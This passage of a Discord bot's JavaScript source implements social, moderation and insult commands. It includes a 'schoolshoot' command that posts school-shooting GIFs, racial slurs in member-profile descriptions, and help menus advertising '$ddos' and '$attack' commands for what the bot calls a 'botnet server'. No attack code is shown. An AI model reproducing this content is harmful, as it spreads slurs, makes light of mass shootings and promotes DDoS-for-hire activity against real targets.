                .setTitle(`${message.author.username} hugged themself...! (weirdo)`)
                .setImage('https://media3.giphy.com/media/ArLxZ4PebH2Ug/giphy.gif')
                .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
            message.channel.send({
                embed: ghembed
            })
            return;
        }
        if (!message.mentions.members.first().user.username === message.isMentioned(message.author)) {
            const hembed = new Discord.RichEmbed()
                .setColor(0xFF0000)
                .setTitle(`${message.author.username} gave ${message.mentions.members.first().user.username} a hug! How sweet!`)
                .setImage(hug[hugresult])
            message.channel.send({
                embed: hembed
            })
            return;
        }
        const ghembed = new Discord.RichEmbed()
            .setColor(0xFF0000)
            .setTitle(`${message.author.username} hugged themself...! (weirdo)`)
            .setImage('https://media3.giphy.com/media/ArLxZ4PebH2Ug/giphy.gif')
        message.channel.send({
            embed: ghembed
        })
    }

    if(message.content.startsWith(prefix + "slap")){
        let slap = [
            "https://media0.giphy.com/media/9j6ZRLTLPxjpu/source.gif",
            "https://media1.tenor.com/images/5c83cc7f91aa60649cee99dada191816/tenor.gif?itemid=8107466",
            "https://j.gifs.com/m2JBnG.gif",
            "https://media.giphy.com/media/K3ZjR6Dc22t9e/giphy.gif",
            "https://media1.tenor.com/images/1fdf5eb71a619b37c252e00857a2a95d/tenor.gif?itemid=6023785",
            "https://i.pinimg.com/originals/05/4d/a9/054da98db828bbbbb2d8945ba305bfac.gif",
            "https://media.giphy.com/media/CkYw9ZeV5kcSI/giphy.gif",
            "https://media0.giphy.com/media/Kzqwo2Oda4OZi/giphy.gif",
            "https://i.hizliresim.com/1DWn7p.gif",
            "https://media1.tenor.com/images/2e5089c0021ad0e800ad1eedfc9f883c/tenor.gif?itemid=5592279",
            

            
            
        ]
        let slapresult = Math.floor((Math.random() * slap.length));
        if (!args[0]) {
            const ghembed = new Discord.RichEmbed()
                .setColor(0xFF0000)
                .setTitle(`${message.author.username} slapped themself...! (O.o)`)
                .setImage('https://media.tenor.com/images/8cd30d7314cfdad0e623fe633a88ab80/tenor.gif')
                .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
            message.channel.send({
                embed: ghembed
            })
            return;
        }
        if (!message.mentions.members.first().user.username === message.isMentioned(message.author)) {
            const hembed = new Discord.RichEmbed()
                .setColor(0xFF0000)
                .setTitle(`${message.author.username} gave ${message.mentions.members.first().user.username} a slap! get fucked, cunt!`)
                .setImage(slap[slapresult])
            message.channel.send({
                embed: hembed
            })
            return;
        }
        const ghembed = new Discord.RichEmbed()
            .setColor(0xFF0000)
            .setTitle(`${message.author.username} slapped themself...! (O.o)`)
            .setImage('https://media1.giphy.com/media/tMIWyF5GUrWwM/source.gif')
        message.channel.send({
            embed: ghembed
        })
    }
    

    if(message.content.startsWith(prefix + "schoolshoot")){
        let slap = [
            "https://i.pinimg.com/originals/d2/bc/22/d2bc22e0cd6186ce04da29a57b34edbd.gif",
            "https://steamuserimages-a.akamaihd.net/ugc/501399955315993668/5E46031D70E3568F78F4A481BCDC269A34C9D524/",
            "https://steamuserimages-a.akamaihd.net/ugc/487894764473773696/57CA74F5A7E4304F7B3958DE9808F03A682A801C/",
            "https://media1.tenor.com/images/cfb7817a23645120d4baba2dcb9205e0/tenor.gif?itemid=5886904",
            "https://legalnoodle.com/wp-content/uploads/2018/06/LavishAbleDore-size_restricted.gif",
            "https://media1.giphy.com/media/XO7zFf3Vqtksg/giphy.gif",
            "http://25.media.tumblr.com/53ba6cac5068aaaa302924ea2a66d8c6/tumblr_mxi1nplwJS1skvvw7o1_500.gif",
            "https://gifimage.net/wp-content/uploads/2017/10/columbine-gif-12.gif",
            "https://66.media.tumblr.com/eef5184ca310c10b4976ead47e20fbe5/tumblr_na1h9u8ins1th0thco1_400.gifv",
            "https://66.media.tumblr.com/9e476389e077452a1b0983e0331f559c/tumblr_nemq188v8b1t5d337o1_400.gifv",
            "https://66.media.tumblr.com/6844567ac3cafcb5c295894c363e694c/tumblr_opnd6yxyHB1su4uzio1_400.gifv"
            

            
            
        ]
        let slapresult = Math.floor((Math.random() * slap.length));
        if (!args[0]) {
            const ghembed = new Discord.RichEmbed()
                .setColor(0xFF0000)
                .setTitle(`${message.author.username} shot himself.`)
                .setImage('https://media0.giphy.com/media/9MtKOa96eyMZG/source.gif')
                .setFooter(`Author Id: ${message.author.id}`, message.author.displayAvatarURL);
            message.channel.send({
                embed: ghembed
            })
            return;
        }
        if (!message.mentions.members.first().user.username === message.isMentioned(message.author)) {
            const hembed = new Discord.RichEmbed()
                .setColor(0xFF0000)
                .setTitle(`${message.author.username} shot up ${message.mentions.members.first().user.username}'s school.`)
                .setImage(slap[slapresult])
            message.channel.send({
                embed: hembed
            })
            return;
        }
        const ghembed = new Discord.RichEmbed()
            .setColor(0xFF0000)
            .setTitle(`${message.author.username} slapped themself...! (O.o)`)
            .setImage('https://media1.giphy.com/media/tMIWyF5GUrWwM/source.gif')
        message.channel.send({
            embed: ghembed
        })
    }
    
    let sender = message.author; 
    let cont = message.content.slice(prefix.length).split(" "); 
    
    if (!message.guild) return;
    if (message.content.startsWith('.kick')) {
        let kUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
     if(!kUser) return message.channel.send("Can't find user!");
     let kReason = args.join(" ").slice(22);
     if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.channel.send("No can do pal!");
     if(kUser.hasPermission("MANAGE_MESSAGES")) return message.channel.send("That person can't be kicked!");
 
    let kickEmbed = new Discord.RichEmbed()
        .setDescription("~Kick~")
        .setColor("#e56b00")
        .addField("Kicked User", `${kUser} with ID ${kUser.id}`)
        .addField("Kicked By", `<@${message.author.id}> with ID ${message.author.id}`)
        .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
        .setImage (`https://media1.tenor.com/images/f03ec2fc5f712b344f5b35d644140236/tenor.gif?itemid=7836666`)
 
    let kickChannel = message.guild.channels.find(`name`, "general");
    if(!kickChannel) return message.channel.send("Can't find the general channel.");
 
        message.guild.member(kUser).kick(kReason);
         kickChannel.send(kickEmbed);
 
    return;
    }
   


    

    if(message.content.startsWith(prefix +"prune")){
        let args = message.content.split(" ").slice(1);
        let author = message.member;
        let role = message.guild.roles.find('name', "Divine");
        if(author.roles.has(role.id)){
            if(!args[0]){
                message.delete();
                message.author.send("No arguments given.");
                return;
            }
            if(args[0] > 100){
                message.delete();
                message.author.send("Maximum is 100 messages at once, oni-chan!!!!");
                return;
            }

            message.delete();
            message.channel.bulkDelete(args[0]);
            message.author.send("done, Senpai. I deleted " + args[0] + " messages.");
           return; 
        }
    }  
    if(command === "switch") {
        let embed = new Discord.RichEmbed()
       .setTitle(`switch`)
       .setColor (666666)
       .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
       .setDescription(`We all know and love him. The generous good old switch that helped thousands of us in the net community. `)
       .addBlankField()
       .setAuthor(" Old School Cool. ")
       .setImage(`https://i.pinimg.com/originals/72/2b/38/722b3837627bee203c0a8c68e39e9352.jpg`)
       .setTimestamp()
       .setFooter(message.author.username, message.author.avatarURL)
        message.channel.send(embed)
      }
    
      if(command === "flipper") {
        let embed = new Discord.RichEmbed()
       .setTitle(`flipper`)
       .setColor (666666)
       .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
       .setDescription(`basically nigger from waist and under, also capable of stealing ur bitch. `)
       .addBlankField()
       .setAuthor(" Sir, pls send me ur botnet source. ")
       .setImage(`https://live.staticflickr.com/666/22461706804_39e1ff90ee_b.jpg`)
       .setTimestamp()
       .setFooter(message.author.username, message.author.avatarURL)
        message.channel.send(embed)
      }
    if(command === "kafuru") {
        let embed = new Discord.RichEmbed()
       .setTitle(`Kafuru`)
       .setColor (0xFF00FF)
       .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
       .setDescription(`idk much about him but Kafuru the nigga that kui scammed over trap photos. `)
       .addBlankField()
       .setAuthor("waifu material ")
       .setImage(`https://img1.ak.crunchyroll.com/i/spire3/fc18b342567b95502c5b0b3f36fa61161429372998_full.gif`)
       .setTimestamp()
       .setFooter(message.author.username, message.author.avatarURL)
        message.channel.send(embed)
      }

      if(command === "clovers") {
        let embed = new Discord.RichEmbed()
       .setTitle(`Clovers`)
       .setColor (0xFF00FF)
       .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
       .setDescription(`Clovers sir, show me your crack selection please!!! `)
       .addBlankField()
       .setAuthor(" Degenerate wholesome lovable furry. ")
       .setImage(`https://cdn.discordapp.com/attachments/668652505512804382/670350713876119581/MVIMG_20200124_160414.jpg`)
       .setTimestamp()
       .setFooter(message.author.username, message.author.avatarURL)
        message.channel.send(embed)
      }

    if(command === "ping") {
        // Calculates ping between sending a message and editing it, giving a nice round-trip latency.
        // The second ping is an average latency between the bot and the websocket server (one-way, not round-trip)
        const m = message.channel.send("> **Pinging!**").then(m => m.delete(3000));
        message.channel.send(`> **Latency is ${message.createdTimestamp - message.createdTimestamp}ms. API Latency is ${Math.round(Client.ping)}ms**`);
      } else

      if(command === "mom") {
        const m = message.channel.send("Mom...😳");
        let embed = new Discord.RichEmbed()
      .setTitle("Fox In a Box!")
      .setAuthor(" Very wholesome fox and everyone's favourite 💖")
      .setColor(0x8acdf7)
      .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
      .setImage (`https://data.whicdn.com/images/327563526/original.jpg`)
      .setDescription(`Fox is also CEO of Racism. Hit him up for n word pass.`)
      message.channel.send(embed);
      
  
  }
    if(command === "info") {
            let embed = new Discord.RichEmbed()
           .setTitle(`Bomb Squad!`)
           .setColor (0xFF00FF)
           .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
           .setDescription(`Server made by Fox and Dad. Probably one of the best botnet servers out there, so take a beer, smoke a cig and chill tf out. `)
           .addBlankField()
           .setAuthor("Bot by Monti| 悲しみはあなたの親友です。")
           .setImage(`https://i.pinimg.com/originals/ed/68/dc/ed68dc24b59d0f9b18605adcf6f9042a.jpg`)
           .setTimestamp()
           .setFooter(message.author.username, message.author.avatarURL)
            message.channel.send(embed)
          }
          if(command === "dad") {
          const m = message.channel.send("Dad in dis mf bish.");
          let embed = new Discord.RichEmbed()
        .setTitle("Dad")
        .setColor(0x8acdf7)
        .setDescription("smoke grass eat ass skip class")
        .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
        .setImage (`https://upload.wikimedia.org/wikipedia/en/e/e7/Viper_You%27ll_Cowards_Don%27t_Even_Smoke_Crack.jpg`)
        .setAuthor("yall mf gay af, gl proving me wrong. Also fuck dem waifus, they aint got shit against me.")
        message.channel.send(embed);

        
        

    }

    if (command === "insult") {
        let user = message.mentions.users.first();
         if (message.mentions.users.size < 1) return message.reply('You must mention someone to roast them.').catch(console.error);
         var roast = [
                   "Were you born on the highway? That is where most accidents happen.",
                   "I was going to give you a nasty look... but I see you already have one.",
                   "Remember when I asked for your opinion? Me neither.",
                   "Everyone’s entitled to act stupid once in awhile, but you really abuse the privilege.",
                   "I'm trying to see things from your point of view, but I can't get my head that far up my ass.",
                   "I haven't seen a fatty like you run that fast since twinkies went on sale for the first time.",
                   "Two wrongs don't make a right, take your parents as an example.",
                   "Just looking at you, I now understand why some animals eat their young offspring.",
                   "Does time actually fly when you're having sex, or was it just one minute after all?",
                   "You should go do that tomorrow. Oh wait, nevermind, you've made enough mistakes already for today.",
                   "This is why you dont have nice things",
                   "My teacher told me to erase mistakes, i'm going to need a bigger eraser.",
                   "You're IQ's lower than your dick size.",
                   "Are you always such an idiot, or do you just show off when I’m around?",
                   "There are some remarkably dumb people in this world. Thanks for helping me understand that.",
                   "I could eat a bowl of alphabet soup and shit out a smarter statement than whatever you just said.",
                   "You’re about as useful as a screen door on a submarine.",
                   "You always bring me so much joy—as soon as you leave the room.",
                   "Stupidity’s not a crime, so feel free to go.",
                   "If laughter is the best medicine, your face must be curing the world.",
                   "The only way you'll ever get laid is if you crawl up a chicken's ass and wait.",
                   "It looks like your face caught fire and someone tried to put it out with a hammer.",
                   "Scientists say the universe is made up of neutrons, protons and electrons. They forgot to mention morons like you.",
                   "Why is it acceptable for you to be an idiot but not for me to point it out?",
                   "You're so fat you could sell shade.",
                   "Your family tree must be a cactus because everyone on it is a prick.",
                   "You'll never be the man your mother is.",
                   "Just because you have an ass doesn't mean you need to act like one.",
                   "Which sexual position produces the ugliest children? Ask your mother she knows.",
                   "If I had a face like yours I'd sue my parents.",
                   "The zoo called. They're wondering how you got out of your cage?",
                   "Hey, you have something on your chin... no, the 3rd one down.",
                   "Aww, it's so cute when you try to talk about things you don't understand.",
                   "You are proof that evolution can go in reverse.",
                   "Brains aren't everything. In your case they're nothing.",
                   "You're so ugly when you look in the mirror, your reflection looks away.",
                   "I'm sorry I didn't get that - I don't speak idiot.",
                   "It's better to let someone think you're stupid than open your mouth and prove it.",
                   "Were you born this stupid or did you take lessons?",
                   "You're such a beautiful, intelligent, wonderful person. Oh I'm sorry, I thought we were having a lying competition.",
                   "Don't you get tired of putting make up on two faces every morning?",
                   "Hey, I'm straighter than the pole your mom dances on.",
                   "If ugliness were measured in bricks, you would be the Great Wall of China.",
                   "I thought I said goodbye to you this morning when I flushed the toilet",
                   "If you're trying to improve the world, you should start with yourself. Nothing needs more help than you do",
                   "Zombies are looking for brains. Don't worry. You're safe.",
                   "spreading rumors? At least you found a hobby spreading something other than your legs.",
                   "i would tell you to eat trash but that’s cannibalism",
                   "If you spoke your mind, you would be speechless",
                   "I can fix my ugliness with plastic surgery but you on the other hand will stay stupid forever",
                   "Acting like a dick won't make yours any bigger",
                   "If I wanted to hear from an asshole, I would have farted",
                   "Roses are red. Violets are blue. God made us beautiful. What the hell happened to you?",
                   "You remind me of a penny, two faced and worthless!",
                   "I've met some pricks in my time but you my friend, are the f*cking cactus",
                   "I'd slap you, but that would be animal abuse",
                   "If you're gonna be a smartass, first you have to be smart. Otherwise you're just an ass. ",
                   "I know I’m talking like an idiot. I have to, other wise you wouldn't understand me.",
                   "You're so dumb, your brain cell died of loneliness",
                   "You shouldn't let your mind wander..its way to small to be out on its own",
                   "I don't know what makes you so dumb, but its working",
                   "You should put the diaper on your mouth, that's where the craps comin' out.",
                   "You would be much more likable if it wasn’t for that hole in your mouth that stupid stuff comes out of. ",
                   "Could you go away please, I'm allergic to douchebags",
                   "If you had any intelligence to question I would have questioned it already.",
                   "I wish I had a lower I.Q,  maybe then I could enjoy your company.",
                   "I would answer you back but life is too short, just like your d*ck",
                   "Mirrors don't lie. Lucky for you, they can't laugh either.",
                   "I was right there are no humans in this channel",
                   "You have a face not even a mother could love....",
                   "You know what I would find if I looked up idiot in the dictionary a picture of you?",
                   "You make the guys on Jackass look like Einstein.....",
                   "I would slap you but I don't want to make your face look any better",
                   "Sorry, I can't put small objects in my mouth or Ill choke",
                   "You should wear a condom on your head, if you're going to be a dick you might as well dress like one",
                   "Have you been shopping lately? They're selling lives at the mall, you should get one"
    
   ];
   var roasts = roast[Math.floor(Math.random() * roast.length)];
       message.channel.send(user.username + " " + roasts);
     } else
    
     if (command === "lockdown") {
     let time = args.join(' ');
     let validUnlocks = ['release', 'unlock'];
     if (!message.guild.member(Client.user).hasPermission('ADMINISTRATOR')) return message.reply('you do not have the correct permissions.').catch(console.error);
     if (!time) return message.reply('You must set a duration for the lockdown in either hours, minutes or seconds');
     if (validUnlocks.includes(time)) {
       message.channel.overwritePermissions(message.guild.id, {
         send_MESSAGES: null
       }).then(() => {
         message.channel.send('Lockdown lifted.');
         clearTimeout(Client.lockit[message.channel.id]);
         delete Client.lockit[message.channel.id];
       }).catch(error => {
         console.log(error);
       });
     } else {
       message.channel.overwritePermissions(message.guild.id, {
         send_MESSAGES: false
       }).then(() => {
         message.channel.send(`Channel locked down for ${ms(ms(time), { long:true })}`).then(() => {
    
           Client.lockit[message.channel.id] = setTimeout(() => {
             message.channel.overwritePermissions(message.guild.id, {
               send_MESSAGES: null
             }).then(message.channel.send('Lockdown lifted.')).catch(console.error);
             delete Client.lockit[message.channel.id];
           }, ms(time));
    
         }).catch(error => {
           console.log(error);
         });
       });
     }
   };
    if(command === "commands") {
        let embed = new Discord.RichEmbed()
        .setAuthor("Bot commands")
        .setTitle(`[𝔔𝔲𝔞𝔯𝔞𝔫𝔱𝔦𝔡𝔡𝔶 𝔠𝔬𝔪𝔪𝔞𝔫𝔡𝔰] :`)
        .addField('**$av**', ' [ Displays Avatar. ] ')
        .addField('**$image**', ' [ Search an image. ]')
        .addField('**$ping**', ' [ Check server Latency. ] ')
        .addField('**$info**', '[ Provides information regarding the bot. ] ')
        .addField('**$server**', '[ Provides server statistics. ] ')
        .addField('**$kiss**', ' [ Kiss a user. ] ')
        .addField('**$hug**', ' [ hug a user. ] ')
        .addField('**$schoolshoot**', ' [ shoot up a school. ] ')
        .addField('**$slap**', ' [ slap a user. ] ')
        .addField('**$hentai**', ' [ Provides you with hentai. ] ')
        .addField('**$tits**', ' [ Provides you with tits. ] ')
        .addField('**$pussy**', ' [ Provides you with pussy. ] ')
        .addField('**$feet**', ' [ Provides you with feet. ] ')
        .addField('**$lewd**', ' [ Provides you with lewd hentai. ] ')
        .addField('**$neko**', ' [ Provides you with nekos. ] ')
        .addField('**$traps**', ' [ Provides you with Traps. ] ')
        .addField('**$bj**', ' [ Provides you with blowjob. ] ')
        .addField('**$ip**', ' [ Provides IP information. ] ')
        .addField('**$kick**', ' [ Kicks a user. ] ')
        .addField('**$ban**', ' [ Bans a user. ] ')
        .addField('**$ddos**', ' [ animated hacker shit :P ] ')
        .addField('**$911**', ' [ animated 9/11 terrorist attack ] ')
        .addField('**$monti**', ' [ monti luvs u] ')
        .setColor('#40FF00')
        .setFooter('nulled.to')
        .setThumbnail ("https://www.searchpng.com/wp-content/uploads/2018/12/Cartoon-Bomb-Clipart-715x715.png")
        .setImage (`https://media.giphy.com/media/31PYPSKeooIvonak2O/giphy.gif`)
        .setTimestamp()
       .setFooter(message.author.username, message.author.avatarURL)
        message.channel.send(embed)
      }
      if(command === "tools") {
        let embed = new Discord.RichEmbed()
        .setAuthor("Welcome to Alina1337.| 悲しみはあなたの親友です。")
        .setTitle(`[𝔄𝔩𝔦𝔫𝔞1337 ℭ𝔬𝔪𝔪𝔞𝔫𝔡𝔰] :`)
        .addField('**$attack**', ' [ Displays usage of the ddos command.] ')
        .addField('**$check**', ' [ Checks server response. ] ')
        .addField('**$ping**', ' [ Check server Latency. ] ')
        .addField('**$info**', '[ Provides information regarding the bot. ] ')
        .addField('**$server**', '[ Provides server statistics. ] ')
        .addField('**$ip**', ' [ Provides IP information. ] ')
        .addField('**$stop**', ' [ Stops all attacks. ] ')
        .addField('**$monti**', ' [ monti luvs u] ')
        .setColor('#080707')
        .setFooter('Bot coded by Raja. [monti] | чем тише ты, тем больше слышишь. Анекдоты, отвали.')
        .setThumbnail ("https://thumbs.gfycat.com/SickWarpedCattle-small.gif")
        .setImage (`https://em.wattpad.com/7e0b4d2fe28fae3a4998093e3e6262151ffd0448/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f776174747061642d6d656469612d736572766963652f53746f7279496d6167652f2d767051786958516475575872773d3d2d3438343433363430372e313465663565643332373232333430373237373232343934303032322e676966?s=fit&w=720&h=720`)
        .setTimestamp()
       .setFooter(message.author.username, message.author.avatarURL)
        message.channel.send(embed)
      }
      if(command ==="monti") {
      const m = message.channel.send("monti! 😳");
      let embed = new Discord.RichEmbed()
    .setTitle("𝔐𝔬𝔫𝔱𝔦")
    .setAuthor(" Monti is a russian teenager living within the slumps of Bomb Squad. You will find him hanging around with Mom, Murphy and Kui smoking a joint talking about cute girls.")
    .setColor('#080707')
    .setURL("https://soundcloud.com/prodpreserve/killyourself")
    .setImage (`https://data.whicdn.com/images/305173429/original.gif`)
    .setDescription(` also he do be creating big discord botzzz against discord TOS 😳😳😳`)
    message.channel.send(embed);
    

}
    
    

   


    
});

Client.login(botSettings.token)
